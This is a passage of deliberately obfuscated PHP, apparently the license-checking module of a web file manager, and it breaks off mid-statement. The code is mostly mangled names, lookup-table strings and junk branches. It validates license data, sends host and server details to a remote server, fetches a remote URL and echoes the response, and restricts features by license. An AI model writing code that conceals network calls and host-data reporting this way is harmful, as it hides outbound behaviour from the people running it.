$this->appRun($¹ÑıÆµ); } else { $this->appRun(ACTION); } } private $lrjc68f40f49 = array(); private $sactb5fb1fca = ''; public function bkrw5a2b4ead() { $ŒĞù¥Ç­ =& $_SERVER[Å¶¨Şêº]; $ı¦ÒŸ®­ =& $_SERVER[»Á¢²Ïˆ]; $this->gnlzb83b8864(); $this->bach08ed8a3e(); $Ğ‹ÚƒéÁ = $ŒĞù¥Ç­[639]; if (strlen($Ğ‹ÚƒéÁ) < $ŒĞù¥Ç­[629]) { return; } $this->oaku74d1eea0(); $áõ¨±ëÑ = $ŒĞù¥Ç­[640]; $this->vscufc7c8caf(); $this->tkuob117aef8(); $İôÎæÛ¡ = $ŒĞù¥Ç­[641]; $this->teqx64d3ec47(); $this->ysxac1081b1d(); $†ãÂ×Œƒ = $ŒĞù¥Ç­[642]; if (!$†ãÂ×Œƒ) { return; } $this->tqsb016ef12f($ı¦ÒŸ®­[25], array($this, $ı¦ÒŸ®­[26])); $•¶¥Ùİ¢ = $ŒĞù¥Ç­[643]; if (!$•¶¥Ùİ¢) { die; } $this->tqsb016ef12f($ı¦ÒŸ®­[27], array($this, $ı¦ÒŸ®­[28])); $ŞŠˆê” = $ŒĞù¥Ç­[644]; $this->tqsb016ef12f($ı¦ÒŸ®­[29], array($this, $ı¦ÒŸ®­[30])); $this->tqsb016ef12f($ı¦ÒŸ®­[31], array($this, $ı¦ÒŸ®­[32])); $ä§¶™Õ = $ŒĞù¥Ç­[645]; while ($ä§¶™Õ < $ŒĞù¥Ç­[20]) { if ($ä§¶™Õ >= 0) { break; } $ä§¶™Õ++; } } public function zkxn42602b36($ÕÚõ¢Û™) { $Œ£“†²Ù =& $_SERVER[Å¶¨Şêº]; $ôÅÉ¾€¼ =& $_SERVER[»Á¢²Ïˆ]; $ËÜ‚­” = Model($ôÅÉ¾€¼[33])->get(); $¯›ÃŒ´¸ = array($ôÅÉ¾€¼[34], $ôÅÉ¾€¼[35], $ôÅÉ¾€¼[36], $ôÅÉ¾€¼[37], $ôÅÉ¾€¼[38], $ôÅÉ¾€¼[39], $ôÅÉ¾€¼[40], $ôÅÉ¾€¼[41], $ôÅÉ¾€¼[42], $ôÅÉ¾€¼[43], $ôÅÉ¾€¼[44], $ôÅÉ¾€¼[45], $ôÅÉ¾€¼[46], $ôÅÉ¾€¼[47], $ôÅÉ¾€¼[48], $ôÅÉ¾€¼[49], $ôÅÉ¾€¼[50], $ôÅÉ¾€¼[51], $ôÅÉ¾€¼[52], $ôÅÉ¾€¼[53], $ôÅÉ¾€¼[54], $ôÅÉ¾€¼[55], $ôÅÉ¾€¼[56], $ôÅÉ¾€¼[57], $ôÅÉ¾€¼[58], $ôÅÉ¾€¼[59], $ôÅÉ¾€¼[60], $ôÅÉ¾€¼[61], $ôÅÉ¾€¼[62], $ôÅÉ¾€¼[63], $ôÅÉ¾€¼[64], $ôÅÉ¾€¼[65], $ôÅÉ¾€¼[66], $ôÅÉ¾€¼[67], $ôÅÉ¾€¼[68], $ôÅÉ¾€¼[69], $ôÅÉ¾€¼[70], $ôÅÉ¾€¼[71], $ôÅÉ¾€¼[72], $ôÅÉ¾€¼[73], $ôÅÉ¾€¼[74], $ôÅÉ¾€¼[75], $ôÅÉ¾€¼[76], $ôÅÉ¾€¼[77], $ôÅÉ¾€¼[78], $ôÅÉ¾€¼[79], $ôÅÉ¾€¼[80], $ôÅÉ¾€¼[81], $ôÅÉ¾€¼[82], $ôÅÉ¾€¼[83], $ôÅÉ¾€¼[84]); foreach ($¯›ÃŒ´¸ as $´–€ßê«) { $¶‘ùÜ§› = $GLOBALS[$ôÅÉ¾€¼[85]][$ôÅÉ¾€¼[86]][$´–€ßê«]; if (isset($ËÜ‚­”[$´–€ßê«])) { $¶‘ùÜ§› = $ËÜ‚­”[$´–€ßê«]; } $ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$´–€ßê«] = $¶‘ùÜ§›; } $ÄôòË¬Á = $ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$ôÅÉ¾€¼[46]]; $æªËæ¯­ = $Œ£“†²Ù[646]; while (strlen($æªËæ¯­) < $Œ£“†²Ù[616]) { if (!$æªËæ¯­) { break; } $æªËæ¯­++; } unset($ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[89]][$ôÅÉ¾€¼[90]]); $ˆÎÔ³õ = $Œ£“†²Ù[647]; if (strlen($ˆÎÔ³õ) < $Œ£“†²Ù[620]) { die; } unset($ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[89]][$ôÅÉ¾€¼[91]]); $›íà© = $Œ£“†²Ù[648]; unset($ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$ôÅÉ¾€¼[46]]); unset($ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$ôÅÉ¾€¼[92]]); $ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$ôÅÉ¾€¼[93]] = array($ôÅÉ¾€¼[94] => (int) $ÄôòË¬Á[$ôÅÉ¾€¼[95]], $ôÅÉ¾€¼[96] => (int) _get($ÄôòË¬Á, $ôÅÉ¾€¼[97], 0)); $ûÊÓş¶ï = $Œ£“†²Ù[649]; if (!$ûÊÓş¶ï) { return; } $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[99]] = Action($ôÅÉ¾€¼[100])->accessToken(); $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[101]] = md5($_SERVER[$ôÅÉ¾€¼[102]] . $ËÜ‚­”[$ôÅÉ¾€¼[103]]); $¼ãä‹Ÿ = $Œ£“†²Ù[650]; if (strlen($¼ãä‹Ÿ) < $Œ£“†²Ù[629]) { die; } $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[104]] = base64_encode(serverInfo()); $‚Á‰İ‚‹ = $Œ£“†²Ù[651]; if (!$‚Á‰İ‚‹) { die; } $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[105]] = $this->sactb5fb1fca; $¶Ù±¨»à = $Œ£“†²Ù[652]; if (strlen($¶Ù±¨»à) < $Œ£“†²Ù[620]) { return; } if ($ËÜ‚­”[$ôÅÉ¾€¼[105]] != $ôÅÉ¾€¼[106]) { $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[107]] = $ËÜ‚­”[$ôÅÉ¾€¼[107]]; $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[108]] = $ËÜ‚­”[$ôÅÉ¾€¼[108]]; $»¯øõ‰ = rand_string(10) . $this->sactb5fb1fca . rand_string(5); $ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[109]][$ôÅÉ¾€¼[110]] = $this->kxcbe0cdd196($»¯øõ‰, $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[101]]); } if ($this->sactb5fb1fca == $ôÅÉ¾€¼[106]) { $ÕÚõ¢Û™[$ôÅÉ¾€¼[87]][$ôÅÉ¾€¼[88]][$ôÅÉ¾€¼[93]][$ôÅÉ¾€¼[97]] = 0; } $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[111]] = _get($this->lrjc68f40f49, $ôÅÉ¾€¼[112], $ôÅÉ¾€¼[6]); $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[113]] = _get($this->lrjc68f40f49, $ôÅÉ¾€¼[114], $ôÅÉ¾€¼[6]); $ä£Ô¤­ = $Œ£“†²Ù[653]; if (!$ä£Ô¤­) { die; } if (_get($GLOBALS, $ôÅÉ¾€¼[115]) && $this->config[$ôÅÉ¾€¼[116]]) { $ÕÚõ¢Û™[$ôÅÉ¾€¼[98]][$ôÅÉ¾€¼[117]] = WEB_ROOT; } return $ÕÚõ¢Û™; } private function teqx64d3ec47() { $÷ø²í† =& $_SERVER[Å¶¨Şêº]; $˜¿‘é“ =& $_SERVER[»Á¢²Ïˆ]; $µª§·Ôş = $_SERVER[$˜¿‘é“[24]] == $˜¿‘é“[118]; $õ¥òÏ× = $÷ø²í†[654]; if (strlen($õ¥òÏ×) < $÷ø²í†[633]) { return; } if ($_SERVER[$˜¿‘é“[24]] == $˜¿‘é“[119] && $_GET[$˜¿‘é“[120]] == $˜¿‘é“[121]) { $µª§·Ôş = !0; } if ($µª§·Ôş) { $øİÊ¬ê = array($˜¿‘é“[105] => $this->sactb5fb1fca, $˜¿‘é“[122] => $this->ghko4b646ef2(), $˜¿‘é“[123] => Model($˜¿‘é“[124])->count()); if ($this->sactb5fb1fca != $˜¿‘é“[106]) { $æ°ì§†¬ = _get($this->lrjc68f40f49, $˜¿‘é“[125]); if ($æ°ì§†¬) { $øİÊ¬ê[$˜¿‘é“[126]] = $æ°ì§†¬; $øİÊ¬ê[$˜¿‘é“[127]] = strtotime(_get($this->lrjc68f40f49, $˜¿‘é“[128])); $øİÊ¬ê[$˜¿‘é“[129]] = _get($this->lrjc68f40f49, $˜¿‘é“[114]); } $áŞÄÂ = Model($˜¿‘é“[33])->get($˜¿‘é“[130], $˜¿‘é“[6], !0); if (is_string($áŞÄÂ) && substr($áŞÄÂ, 0, 1) == $˜¿‘é“[131]) { $áŞÄÂ = json_decode_force($áŞÄÂ); } if (is_array($áŞÄÂ) && $áŞÄÂ[$˜¿‘é“[132]] && strstr($áŞÄÂ[$˜¿‘é“[132]], $˜¿‘é“[133])) { $æäÓ™è³ = explode($˜¿‘é“[133], $áŞÄÂ[$˜¿‘é“[132]]); $øİÊ¬ê[$˜¿‘é“[134]] = $æäÓ™è³[0]; } } $øİÊ¬ê = $this->oehdac641a5b(json_encode($øİÊ¬ê), md5($˜¿‘é“[135])); $¢™ßäšŞ = $÷ø²í†[655]; if (!$¢™ßäšŞ) { die; } $ñëíºá… = array($˜¿‘é“[136] => $øİÊ¬ê); call_user_func(array($˜¿‘é“[137], $˜¿‘é“[138]), $ñëíºá…); } if ($this->sactb5fb1fca == $˜¿‘é“[106]) { return; } $°Ò–Éİ = array($˜¿‘é“[139], $˜¿‘é“[140], $˜¿‘é“[141], $˜¿‘é“[142], $˜¿‘é“[143], $˜¿‘é“[144]); $›ˆ É€¿ = $÷ø²í†[656]; while (strlen($›ˆ É€¿) < $÷ø²í†[616]) { if (!$›ˆ É€¿) { break; } $›ˆ É€¿++; } $ƒ»Ğ¦Ìä = Model($˜¿‘é“[33])->get(); $ñëíºá… = array($˜¿‘é“[145] => $ƒ»Ğ¦Ìä[$˜¿‘é“[34]], $˜¿‘é“[146] => $ƒ»Ğ¦Ìä[$˜¿‘é“[35]], $˜¿‘é“[147] => $˜¿‘é“[6]); $‰Ù¬ïù = $÷ø²í†[657]; if (strlen($‰Ù¬ïù) < $÷ø²í†[620]) { die; } foreach ($°Ò–Éİ as $¾öÊŸ¤) { if (!isset($ƒ»Ğ¦Ìä[$¾öÊŸ¤]) || !$ƒ»Ğ¦Ìä[$¾öÊŸ¤]) { continue; } $ñëíºá…[$¾öÊŸ¤] = $ƒ»Ğ¦Ìä[$¾öÊŸ¤]; $í°²’™ˆ = $÷ø²í†[658]; } call_user_func(array($˜¿‘é“[137], $˜¿‘é“[138]), $ñëíºá…); $”•åµ—ä = $÷ø²í†[659]; } private function vscufc7c8caf() { $û®ÉŞß£ =& $_SERVER[Å¶¨Şêº]; $Ä™õÆùë =& $_SERVER[»Á¢²Ïˆ]; if ($_SERVER[$Ä™õÆùë[24]] != $Ä™õÆùë[148]) { return; } if (!_get($GLOBALS, $Ä™õÆùë[115])) { die; } $ì˜™±„» = $GLOBALS[$Ä™õÆùë[13]]; if (isset($ì˜™±„»[$Ä™õÆùë[149]])) { $this->lshr820c8415(); die; } if (!isset($ì˜™±„»[$Ä™õÆùë[150]]) || strlen($ì˜™±„»[$Ä™õÆùë[150]]) != 16) { show_json($Ä™õÆùë[151] . $ì˜™±„»[$Ä™õÆùë[150]], !1); } $Ô‹±úİà = Model($Ä™õÆùë[33])->get($Ä™õÆùë[103]); $²ŞÚÑ·À = md5($_SERVER[$Ä™õÆùë[102]] . $Ô‹±úİà); $Œ¼£ÑÍ = $û®ÉŞß£[660]; while ($Œ¼£ÑÍ < $û®ÉŞß£[616]) { if ($Œ¼£ÑÍ >= 0) { break; } $Œ¼£ÑÍ++; } $¸ÇªëÉ¦ = array($Ä™õÆùë[150] => $ì˜™±„»[$Ä™õÆùë[150]], $Ä™õÆùë[152] => rand_string(16), $Ä™õÆùë[153] => $Ä™õÆùë[135], $Ä™õÆùë[154] => $Ä™õÆùë[155], $Ä™õÆùë[156] => $_SERVER[$Ä™õÆùë[157]], $Ä™õÆùë[158] => $_SERVER[$Ä™õÆùë[159]], $Ä™õÆùë[160] => $_SERVER[$Ä™õÆùë[161]], $Ä™õÆùë[101] => $²ŞÚÑ·À, $Ä™õÆùë[162] => Model($Ä™õÆùë[33])->get($Ä™õÆùë[130])); if ($ì˜™±„»[$Ä™õÆùë[163]] == $Ä™õÆùë[164]) { $˜»¬‘ÖÅ = $this->oehdac641a5b($²ŞÚÑ·À, $Ä™õÆùë[165]); $§û“Ëò = $this->kxcbe0cdd196(json_encode($¸ÇªëÉ¦), $²ŞÚÑ·À . $Ä™õÆùë[166], 3); $§û“Ëò = $§û“Ëò . $Ä™õÆùë[167] . $_SERVER[$Ä™õÆùë[157]]; $Ãª¥ŠÜö = $this->vfnd4b1607a9($Ä™õÆùë[168] . $˜»¬‘ÖÅ . $Ä™õÆùë[169] . $§û“Ëò, -1); show_json($Ãª¥ŠÜö, !0); } else { if ($ì˜™±„»[$Ä™õÆùë[163]] == $Ä™õÆùë[170]) { $îâ¼ƒùŸ = substr(md5($Ä™õÆùë[171] . $²ŞÚÑ·À), 12, 15) . $Ä™õÆùë[172]; $§û“Ëò = $this->jblaeb92156a(trim($ì˜™±„»[$Ä™õÆùë[173]]), $îâ¼ƒùŸ, 2); $ı¢Ã™ëÁ = json_decode($§û“Ëò, !0); if (!is_array($ı¢Ã™ëÁ) || !is_array($ı¢Ã™ëÁ[$Ä™õÆùë[174]]) || $ı¢Ã™ëÁ[$Ä™õÆùë[150]] != !0) { $Û°Î¤ùŠ = $Ä™õÆùë[175]; $ïöÛµº‡ = $ı¢Ã™ëÁ[$Ä™õÆùë[174]] ? $Ä™õÆùë[176] . $ı¢Ã™ëÁ[$Ä™õÆùë[174]] : $Û°Î¤ùŠ; show_json($ïöÛµº‡, !1); } else { $¸ÇªëÉ¦[$Ä™õÆùë[152]] = $ı¢Ã™ëÁ[$Ä™õÆùë[174]][$Ä™õÆùë[177]]; } } else { $ı¢Ã™ëÁ = $this->vfnd4b1607a9($Ä™õÆùë[178], $¸ÇªëÉ¦, 10); $ç—Ö³óé = $û®ÉŞß£[661]; if (!$ç—Ö³óé) { return; } } } if (!is_array($ı¢Ã™ëÁ) || !is_array($ı¢Ã™ëÁ[$Ä™õÆùë[174]]) || $ı¢Ã™ëÁ[$Ä™õÆùë[150]] != !0) { $Û°Î¤ùŠ = LNG($Ä™õÆùë[179]); $ïöÛµº‡ = $ı¢Ã™ëÁ[$Ä™õÆùë[174]] ? $Ä™õÆùë[176] . $ı¢Ã™ëÁ[$Ä™õÆùë[174]] : $Û°Î¤ùŠ; show_json($ïöÛµº‡, !1); } $áøƒğÌè = $ı¢Ã™ëÁ[$Ä™õÆùë[174]]; $ëŞ–‚²‘ = $this->jsbaaf6bc402($áøƒğÌè[$Ä™õÆùë[180]]); $«Åã‚£Ç = $û®ÉŞß£[662]; while (strlen($«Åã‚£Ç) < $û®ÉŞß£[629]) { if (!$«Åã‚£Ç) { break; } $«Åã‚£Ç++; } if (!$ëŞ–‚²‘ || $ëŞ–‚²‘ != $áøƒğÌè[$Ä™õÆùë[128]]) { $÷’¼¶¶§ = array($Ä™õÆùë[181] => Model($Ä™õÆùë[33])->get($Ä™õÆùë[103]), $Ä™õÆùë[182] => $_SERVER[$Ä™õÆùë[102]], $Ä™õÆùë[183] => this_url(), $Ä™õÆùë[158] => $_SERVER[$Ä™õÆùë[159]]); $§û“Ëò = $this->acwgdf3e81a0(json_encode($÷’¼¶¶§)); $this->vfnd4b1607a9($Ä™õÆùë[184] . $§û“Ëò); show_json(LNG($Ä™õÆùë[185]), !0); } $¾¾ô·é¶ = array($Ä™õÆùë[186] => $áøƒğÌè[$Ä™õÆùë[187]], $Ä™õÆùë[188] => $áøƒğÌè[$Ä™õÆùë[189]], $Ä™õÆùë[190] => rand_string(16), $Ä™õÆùë[105] => $áøƒğÌè[$Ä™õÆùë[191]]); if ($¸ÇªëÉ¦[$Ä™õÆùë[152]]) { $¾¾ô·é¶[$Ä™õÆùë[190]] = $¸ÇªëÉ¦[$Ä™õÆùë[152]]; } $ªÆüÜƒ½ = substr(md5($¾¾ô·é¶[$Ä™õÆùë[188]]), 10, 10); $éüâşÎì = $ªÆüÜƒ½ . $¾¾ô·é¶[$Ä™õÆùë[105]] . $¾¾ô·é¶[$Ä™õÆùë[190]]; $¾¾ô·é¶[$Ä™õÆùë[107]] = strrev(base64_encode($this->oehdac641a5b($éüâşÎì, $Ä™õÆùë[192]))); $ìÚöé­” = $û®ÉŞß£[663]; while (strlen($ìÚöé­”) < $û®ÉŞß£[616]) { if (!$ìÚöé­”) { break; } $ìÚöé­”++; } $É“íÀ—Ö = rand_string(16); $¥Ÿ›–İå = $û®ÉŞß£[664]; if (strlen($¥Ÿ›–İå) < $û®ÉŞß£[616]) { die; } $œœßœß = $É“íÀ—Ö . $¾¾ô·é¶[$Ä™õÆùë[105]] . $this->oehdac641a5b(md5($¾¾ô·é¶[$Ä™õÆùë[186]]), $É“íÀ—Ö); $¾¾ô·é¶[$Ä™õÆùë[108]] = base64_encode(strrev($this->oehdac641a5b($œœßœß, $Ä™õÆùë[193]))); $Îş˜¦Ü¡ = $û®ÉŞß£[665]; if ($áøƒğÌè[$Ä™õÆùë[194]] && $áøƒğÌè[$Ä™õÆùë[194]] >= 1) { Model($Ä™õÆùë[33])->setDeep($Ä™õÆùë[195], $Ä™õÆùë[121]); } Model($Ä™õÆùë[33])->set($¾¾ô·é¶); $ÖÔ…äÍÓ = md5($_SERVER[$Ä™õÆùë[102]] . strrev($Ô‹±úİà) . $¾¾ô·é¶[$Ä™õÆùë[188]]); $üí´°¥ = $û®ÉŞß£[666]; $›§ä‚—š = strrev(substr($ÖÔ…äÍÓ, 10, 16)); $¯£…²üû = $û®ÉŞß£[667]; if (strlen($¯£…²üû) < $û®ÉŞß£[629]) { die; } $ÊßÀü½® = $this->kxcbe0cdd196(json_encode($áøƒğÌè), $ÖÔ…äÍÓ); $Ñë±Óî¥ = array_to_keyvalue(Model($Ä™õÆùë[7])->listData(), $Ä™õÆùë[196]); $ŞŠ×ÊöÑ = $Ñë±Óî¥[$Ä™õÆùë[197]]; $Øº·¨¶Ü = array(); $¼ÃÂªĞí = $û®ÉŞß£[668]; $Øº·¨¶Ü[$›§ä‚—š] = $ÊßÀü½®; Model($Ä™õÆùë[7])->update($ŞŠ×ÊöÑ[$Ä™õÆùë[198]], array($Ä™õÆùë[199] => $Øº·¨¶Ü)); $ˆÈé¤åø = $û®ÉŞß£[669]; if (!$ˆÈé¤åø) { die; } $this->lrjc68f40f49 = $áøƒğÌè; $Ü¢¥éÔ¬ = $û®ÉŞß£[670]; $this->sactb5fb1fca = $¾¾ô·é¶[$Ä™õÆùë[105]]; $³½Óåñ = $û®ÉŞß£[671]; if (!$³½Óåñ) { die; } $this->licenseRegistSuccess(); Cache::set($Ä™õÆùë[200] . md5($Ô‹±úİà . $Ä™õÆùë[201]), $Ä™õÆùë[6]); show_json(LNG($Ä™õÆùë[185]), !0); $„éÛ™¦Ü = $û®ÉŞß£[672]; if (!$„éÛ™¦Ü) { return; } } private function licenseRegistSuccess() { $ä¯¦°ï =& $_SERVER[»Á¢²Ïˆ]; $Áğ±¨çş = Model($ä¯¦°ï[33])->get(); if ($Áğ±¨çş[$ä¯¦°ï[63]] != $ä¯¦°ï[121]) { Model($ä¯¦°ï[33])->set($ä¯¦°ï[63], $ä¯¦°ï[121]); } Action($ä¯¦°ï[202])->initStart(!0); } private function lshr820c8415() { $ûõóÂ‘´ =& $_SERVER[Å¶¨Şêº]; $¹äªÕ… =& $_SERVER[»Á¢²Ïˆ]; Model($¹äªÕ…[33])->set(array($¹äªÕ…[186] => $¹äªÕ…[6], $¹äªÕ…[188] => $¹äªÕ…[6], $¹äªÕ…[105] => $¹äªÕ…[106], $¹äªÕ…[107] => $¹äªÕ…[6], $¹äªÕ…[108] => $¹äªÕ…[6])); Model($¹äªÕ…[33])->setDeep($¹äªÕ…[195], $¹äªÕ…[203]); $Ô”ş±ÌÑ = $ûõóÂ‘´[673]; while (strlen($Ô”ş±ÌÑ) < $ûõóÂ‘´[629]) { if (!$Ô”ş±ÌÑ) { break; } $Ô”ş±ÌÑ++; } $this->lrjc68f40f49 = array(); $this->sactb5fb1fca = $¹äªÕ…[106]; } private function gnlzb83b8864() { $òƒª…ˆ„ =& $_SERVER[Å¶¨Şêº]; $ë«­ÅËß =& $_SERVER[»Á¢²Ïˆ]; $_SERVER[$ë«­ÅËß[159]] = _get($_SERVER, $ë«­ÅËß[159], APP_HOST); $this->sactb5fb1fca = $ë«­ÅËß[106]; $§Šæ›ëÛ = $òƒª…ˆ„[674]; if (!$§Šæ›ëÛ) { die; } $œ®âªó­ = Model($ë«­ÅËß[33])->get(); $Ç—òèĞÌ = $òƒª…ˆ„[675]; if ($œ®âªó­[$ë«­ÅËß[105]] == $ë«­ÅËß[106]) { return; } $ßáØå³• = Model($ë«­ÅËß[33])->get($ë«­ÅËß[103]); $ÓÛŞ¤‰ = $ë«­ÅËß[200] . md5($ßáØå³• . $ë«­ÅËß[201]); $ùÛáÒùë = Cache::get($ÓÛŞ¤‰); if (!is_array($ùÛáÒùë) || !isset($ùÛáÒùë[$ë«­ÅËß[204]]) || time() - $ùÛáÒùë[$ë«­ÅËß[204]] >= 60) { $ŸÔŠ ¾Ñ = Model($ë«­ÅËß[7])->loadList(); $‹êÏĞ¥ø = $ŸÔŠ ¾Ñ[$ë«­ÅËß[197]]; $õ„Æ¼ÂÒ = md5($_SERVER[$ë«­ÅËß[102]] . strrev($ßáØå³•) . $œ®âªó­[$ë«­ÅËß[188]]); $ŞÍ¹Éì– = strrev(substr($õ„Æ¼ÂÒ, 10, 16)); $ùÛáÒùë = $this->jblaeb92156a($‹êÏĞ¥ø[$ë«­ÅËß[85]][$ŞÍ¹Éì–], $õ„Æ¼ÂÒ); $ùÛáÒùë = json_decode($ùÛáÒùë, !0); } if (!is_array($ùÛáÒùë)) { return $this->lshr820c8415(); } $ÍÈòôÓ = strtotime($ùÛáÒùë[$ë«­ÅËß[128]]); if (time() >= $ÍÈòôÓ) { return $this->lshr820c8415(); } if (time() - $ùÛáÒùë[$ë«­ÅËß[204]] > 20) { $ùÛáÒùë[$ë«­ÅËß[204]] = time(); Cache::set($ÓÛŞ¤‰, $ùÛáÒùë); } $this->lrjc68f40f49 = $ùÛáÒùë; $this->sactb5fb1fca = $œ®âªó­[$ë«­ÅËß[105]]; } private function bach08ed8a3e() { $È™‚ûö‡ =& $_SERVER[Å¶¨Şêº]; $±¼¦å  =& $_SERVER[»Á¢²Ïˆ]; $£Äİ“™ş = $GLOBALS[$±¼¦å [13]]; $ØŠå’ˆß = $È™‚ûö‡[676]; while ($ØŠå’ˆß < $È™‚ûö‡[629]) { if ($ØŠå’ˆß >= 0) { break; } $ØŠå’ˆß++; } $©„Ø´ ’ = $_SERVER[$±¼¦å [24]]; $êŠ·Œ¦« = $È™‚ûö‡[677]; if (strlen($êŠ·Œ¦«) < $È™‚ûö‡[629]) { die; } if ($©„Ø´ ’ == $±¼¦å [205] && $this->sactb5fb1fca == $±¼¦å [106]) { show_json(LNG($±¼¦å [206]), !1, $±¼¦å [207]); } $ï½˜¤Ÿº = array($±¼¦å [208], $±¼¦å [209]); if (in_array($©„Ø´ ’, $ï½˜¤Ÿº)) { if ($this->sactb5fb1fca == $±¼¦å [106] && isset($£Äİ“™ş[$±¼¦å [210]])) { show_json(LNG($±¼¦å [206]), !1, $±¼¦å [207]); die; } $ëÔ°‘ = $this->ghko4b646ef2(); if ($ëÔ°‘ != intval($±¼¦å [211])) { if ($ëÔ°‘ <= Model($±¼¦å [124])->count()) { show_json(LNG($±¼¦å [212]), !1, $±¼¦å [207]); die; } } } } private function oaku74d1eea0() { $¶Ê¦ùòŒ =& $_SERVER[»Á¢²Ïˆ]; $ıú¦—æİ = array($¶Ê¦ùòŒ[118], $¶Ê¦ùòŒ[119]); if (!_get($GLOBALS, $¶Ê¦ùòŒ[115]) || !isset($_GET[$¶Ê¦ùòŒ[213]])) { return; } if (!in_array($_SERVER[$¶Ê¦ùòŒ[24]], $ıú¦—æİ)) { return; } $¨ªç§ŸÊ = $¶Ê¦ùòŒ[214]; $¨ªç§ŸÊ = $this->amxq7225ffb1($¨ªç§ŸÊ, $¶Ê¦ùòŒ[215]); $…€ †½é = stream_context_create(array($¶Ê¦ùòŒ[216] => array($¶Ê¦ùòŒ[217] => $¶Ê¦ùòŒ[218], $¶Ê¦ùòŒ[219] => 3))); $™ØÅï¾à = @file_get_contents($¨ªç§ŸÊ, !1, $…€ †½é); header($¶Ê¦ùòŒ[220]); if ($™ØÅï¾à && strstr($™ØÅï¾à, $¶Ê¦ùòŒ[221])) { echo $™ØÅï¾à; } die; } public function ofzp84428e23($äÁñàÖ) { $‚ç¿íÄ¢ =& $_SERVER[Å¶¨Şêº]; $“ªÍæ£Ä =& $_SERVER[»Á¢²Ïˆ]; if ($this->sactb5fb1fca == $“ªÍæ£Ä[222]) { return $äÁñàÖ; } $µº‚–˜ğ = array($“ªÍæ£Ä[223] => $“ªÍæ£Ä[224], $“ªÍæ£Ä[225] => $“ªÍæ£Ä[224], $“ªÍæ£Ä[226] => $“ªÍæ£Ä[224], $“ªÍæ£Ä[227] => $“ªÍæ£Ä[224], $“ªÍæ£Ä[228] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[230] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[231] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[232] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[233] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[234] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[235] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[236] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[237] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[238] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[239] => $“ªÍæ£Ä[229], $“ªÍæ£Ä[240] => $“ªÍæ£Ä[229]); $ÈŞ…ÛÃÏ = $‚ç¿íÄ¢[678]; while ($ÈŞ…ÛÃÏ < $‚ç¿íÄ¢[616]) { if ($ÈŞ…ÛÃÏ >= 0) { break; } $ÈŞ…ÛÃÏ++; } $ÍÎ®¬ûÎ = explode($“ªÍæ£Ä[241], _get($this->lrjc68f40f49, $“ªÍæ£Ä[112], $“ªÍæ£Ä[6])); $ƒ˜­½ŞÉ = array(); foreach ($µº‚–˜ğ as $ã¦Ñ¢¢ => $¢‹•æ®£) { if ($¢‹•æ®£ == $“ªÍæ£Ä[224] && substr($this->sactb5fb1fca, 0, 1) == $“ªÍæ£Ä[224]) { continue; } if (!in_array($ã¦Ñ¢¢, $ÍÎ®¬ûÎ)) { $ƒ˜­½ŞÉ[] = $ã¦Ñ¢¢; } } foreach ($ƒ˜­½ŞÉ as $ã¦Ñ¢¢) { unset($äÁñàÖ[$ã¦Ñ¢¢]); } return $äÁñàÖ; $Õş÷Ä‹ñ = $‚ç¿íÄ¢[679]; if (strlen($Õş÷Ä‹ñ) < $‚ç¿íÄ¢[620]) { die; } } private function ysxac1081b1d() { $Ãôöå =& $_SERVER[»Á¢²Ïˆ]; if ($this->sactb5fb1fca != $Ãôöå[106]) { $GLOBALS[$Ãôöå[85]][$Ãôöå[89]][$Ãôöå[242]] = $Ãôöå[203]; return; } $GLOBALS[$Ãôöå[85]][$Ãôöå[243]] = $Ãôöå[121]; if (Model($Ãôöå[244])->get($Ãôöå[63]) != $Ãôöå[203]) { Model($Ãôöå[244])->set($Ãôöå[63], $Ãôöå[203]); } } public function duxwcb707dcb() { $ı‚×·§Ğ =& $_SERVER[Å¶¨Şêº]; return $_SERVER[»Á¢²Ïˆ][245]; $ÖŠŸŒÃÑ = $ı‚×·§Ğ[680]; if (strlen($ÖŠŸŒÃÑ) < $ı‚×·§Ğ[20]) { return; } } private function tkuob117aef8() { $³Ò«˜¼ˆ =& $_SERVER[Å¶¨Şêº]; $‡¥„†‹Õ =& $_SERVER[»Á¢²Ïˆ]; $¢Š‚¸Ø¥ = array($‡¥„†‹Õ[246], $‡¥„†‹Õ[247], $‡¥„†‹Õ[248]); $¶ğ¡ÉŞ = $‡¥„†‹Õ[249] . md5($‡¥„†‹Õ[250]); $ìû­Œ„ = $³Ò«˜¼ˆ[681]; if (!$ìû­Œ„) { die; } if ($this->sactb5fb1fca == $‡¥„†‹Õ[106] || !_get($GLOBALS, $‡¥„†‹Õ[115])) { return; } if (!in_array($_SERVER[$‡¥„†‹Õ[24]], $¢Š‚¸Ø¥)) { return; } if (time() % 4 != 0) { return; } $Ä’’£õ = call_user_func(array($‡¥„†‹Õ[251], $‡¥„†‹Õ[252]), $¶ğ¡ÉŞ); $œ«â®Ê· = 